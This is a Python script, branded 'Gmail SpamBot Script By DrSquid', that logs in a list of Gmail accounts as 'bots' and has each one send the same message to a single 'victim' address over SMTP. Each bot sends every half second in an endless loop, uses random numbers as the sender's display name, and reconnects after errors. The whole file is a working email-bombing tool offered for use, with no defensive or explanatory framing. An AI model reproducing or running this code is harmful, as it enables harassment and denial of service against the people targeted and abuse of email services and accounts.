import smtplib, time, threading, random, sys, os

class SpamBot:
    def __init__(self, email, reciever, subject, msg):
        self.emaillist = email
        self.reciever = reciever
        self.subject = subject
        self.msg = msg
        self.clients = []
        print("\n[+] Preparing Spam Bots.....")
    def login_bots(self):
        for i in self.emaillist:
            self.attempt_login(i[0], i[1])
    def attempt_login(self, email, password, spamerror=False):
        client = smtplib.SMTP("smtp.gmail.com",587)
        client.ehlo()
        client.starttls()
        client.login(email, password)
        self.clients.append([client, email, password])
        if spamerror:
            bot = threading.Thread(target=self.spam, args=(client, email, password))
            bot.start()
        else:
            print(f"[+] Bot {email} is ready to fire!")
    def begin_spam(self):
        print("\n[+] Readying Bots....")
        for i in self.clients:
            bot = threading.Thread(target=self.spam, args=(i[0],i[1], i[2]))
            bot.start()
        print(f"[+] Bots are spamming email {self.reciever}!")
    def gen_packet(self, num):
        return f"From: {random.randint(1000000000,99999999999)} <nobodyasked@gmail.com>\nSubject: {self.subject}{num}\n\n{self.msg}"""
    def spam(self, email, fr_email, password):
        spam_msg = 1
        while True:
            try:
                email.sendmail(from_addr=fr_email,to_addrs=self.reciever, msg=self.gen_packet(spam_msg))
                spam_msg += 1
                time.sleep(0.5)
            except Exception as e:
                print(f"[+] Error with Bot: {fr_email}: {e}")
                email.quit()
                while True:
                    try:
                        print(f"[+] {fr_email} is attempting to reconnect in 30 seconds...")
                        time.sleep(30)
                        email = smtplib.SMTP("smtp.gmail.com",587)
                        email.ehlo()
                        email.starttls()
                        email.login(fr_email, password)
                        print(f"[+] Bot {fr_email} has reconnected and is now spamming!")
                        break
                    except Exception as e:
                        print(f"[+] Error with reconnecting Bot {fr_email} to SMTP Servers: {e}")
class BotAdder:
    def logo(self):
        return """
  _________            .__    .____________                                                  ____    _______   
 /   _____/ ________ __|__| __| _/   _____/__________    _____   _____   ___________  ___  _/_   |   \   _  \  
 \_____  \ / ____/  |  \  |/ __ |\_____  \\\____ \__  \  /     \ /     \_/ __ \_  __ \ \  \/ /|   |   /  /_\  \ 
 /        < <_|  |  |  /  / /_/ |/        \  |_> > __ \|  Y Y  \  Y Y  \  ___/|  | \/  \   / |   |   \  \_/   \\
/_______  /\__   |____/|__\____ /_______  /   __(____  /__|_|  /__|_|  /\___  >__|      \_/  |___| /\ \_____  /
        \/    |__|             \/       \/|__|       \/      \/      \/     \/                     \/       \/ 
Gmail SpamBot Script By DrSquid
"""
    def __init__(self):
        self.bots = []
    def add_bots(self):
        print(self.logo())
        inputs = True
        subject = input("[+] What is the subject for the email?: ")
        msg = input("[+] Enter the msg to be spammed: ")
        spam_email = input("[+] Enter the victims email: ")
        while inputs:
            efficientornot = input("[+] Would you like to use a txt file for the bot emails?(yes/no): ")
            if efficientornot.lower() == "yes":
                emailsfile = input("[+] Enter txt file with the bots: ")
                botfile = open(emailsfile,"r")
                content = botfile.read().split("\n")
                for i in content:
                    try:
                        self.bots.append([i.strip("\n").split()[0], i.strip("\n").split()[1]])
                    except:
                        print("[+] There was an error with adding the Bot to the botnet.")
                botfile.close()
                inputs = False
            else:
                while inputs:
                    if sys.platform == "win32":
                        os.system("cls")
                    else:
                        os.system("clear")
                    print(self.logo())
                    email = input("[+] Enter Email Address of Bot: ")
                    password = input("[+] Enter Password of Bot: ")
                    if email == "stop":
                        print(f"[+] Preparing to SpamBot: {spam_email}")
                        inputs = False
                        break
                    self.bots.append([email, password])
            spammer = SpamBot(self.bots,spam_email, subject, msg)
            spammer.login_bots()
            spammer.begin_spam()
spammer = BotAdder()
spammer.add_bots()
